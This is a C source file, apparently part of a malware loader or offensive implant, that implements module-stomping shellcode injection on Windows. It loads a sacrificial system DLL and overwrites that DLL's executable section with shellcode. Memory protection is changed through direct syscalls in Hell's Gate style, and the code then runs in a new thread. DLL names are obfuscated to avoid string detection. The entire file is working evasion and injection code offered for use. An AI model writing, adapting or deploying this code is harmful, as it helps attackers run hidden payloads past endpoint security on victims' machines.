/*
 * Module Stomping Injection — via dynamic API resolution
 */

#include "module_stomp.h"
#include "winapi.h"
#include "hellsgate.h"

#if INJECT_MODULE_STOMP

extern SYSCALL_TABLE g_Syscalls;

/* Sacrificial DLL names built as char arrays (no string literals) */
static void GetSacrificialName(int idx, char *out) {
    switch (idx) {
        case 0: { char s[] = {'x','p','s','p','r','i','n','t','.','d','l','l',0}; memcpy(out, s, 13); break; }
        case 1: { char s[] = {'d','b','g','h','e','l','p','.','d','l','l',0}; memcpy(out, s, 12); break; }
        case 2: { char s[] = {'w','i','n','s','c','a','r','d','.','d','l','l',0}; memcpy(out, s, 13); break; }
        case 3: { char s[] = {'m','s','t','s','c','a','x','.','d','l','l',0}; memcpy(out, s, 12); break; }
        default: out[0] = 0;
    }
}

static PIMAGE_SECTION_HEADER FindTextSection(PBYTE base) {
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
    PIMAGE_NT_HEADERS nt  = (PIMAGE_NT_HEADERS)(base + dos->e_lfanew);
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);

    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (sec[i].Characteristics & IMAGE_SCN_MEM_EXECUTE)
            return &sec[i];
    }
    return NULL;
}

BOOL ModuleStompInject(PBYTE shellcode, SIZE_T sc_size, PSTOMP_RESULT result) {
    HMODULE hMod = NULL;
    PIMAGE_SECTION_HEADER text_sec = NULL;

    ZeroMemory(result, sizeof(STOMP_RESULT));

    for (int i = 0; i < 4; i++) {
        char name[16];
        GetSacrificialName(i, name);
        if (!name[0]) break;

        hMod = g_Api.pLoadLibraryA(name);
        SecureZeroMemory(name, sizeof(name));
        if (!hMod) continue;

        text_sec = FindTextSection((PBYTE)hMod);
        if (text_sec && text_sec->Misc.VirtualSize >= sc_size)
            break;

        g_Api.pFreeLibrary(hMod);
        hMod = NULL;
        text_sec = NULL;
    }

    if (!hMod || !text_sec) return FALSE;

    PVOID text_addr = (PBYTE)hMod + text_sec->VirtualAddress;
    SIZE_T text_size = text_sec->Misc.VirtualSize;
    NTSTATUS status;

    ULONG old_protect;
    PVOID protect_addr = text_addr;
    SIZE_T protect_size = text_size;
    SetSyscallEntry(g_Syscalls.NtProtectVirtualMemory.dwSSN,
        g_Syscalls.NtProtectVirtualMemory.pSyscallAddr);
    status = DoSyscall((HANDLE)-1, &protect_addr, &protect_size,
        PAGE_READWRITE, &old_protect);
    if (!NT_SUCCESS(status)) { g_Api.pFreeLibrary(hMod); return FALSE; }

    SecureZeroMemory(text_addr, text_size);
    memcpy(text_addr, shellcode, sc_size);

    protect_addr = text_addr;
    protect_size = text_size;
    SetSyscallEntry(g_Syscalls.NtProtectVirtualMemory.dwSSN,
        g_Syscalls.NtProtectVirtualMemory.pSyscallAddr);
    status = DoSyscall((HANDLE)-1, &protect_addr, &protect_size,
        PAGE_EXECUTE_READ, &old_protect);
    if (!NT_SUCCESS(status)) { g_Api.pFreeLibrary(hMod); return FALSE; }

    HANDLE hThread = NULL;
    SetSyscallEntry(g_Syscalls.NtCreateThreadEx.dwSSN,
        g_Syscalls.NtCreateThreadEx.pSyscallAddr);
    status = DoSyscall(&hThread, THREAD_ALL_ACCESS, NULL, (HANDLE)-1,
        text_addr, NULL, 0, (SIZE_T)0, (SIZE_T)0, (SIZE_T)0, NULL);
    if (!NT_SUCCESS(status)) { g_Api.pFreeLibrary(hMod); return FALSE; }

    SetSyscallEntry(g_Syscalls.NtClose.dwSSN, g_Syscalls.NtClose.pSyscallAddr);
    DoSyscall(hThread);

    result->base_addr   = text_addr;
    result->region_size = text_size;
    result->hModule     = hMod;

    return TRUE;
}

#else
BOOL ModuleStompInject(PBYTE shellcode, SIZE_T sc_size, PSTOMP_RESULT result) {
    (void)shellcode; (void)sc_size; (void)result;
    return FALSE;
}
#endif
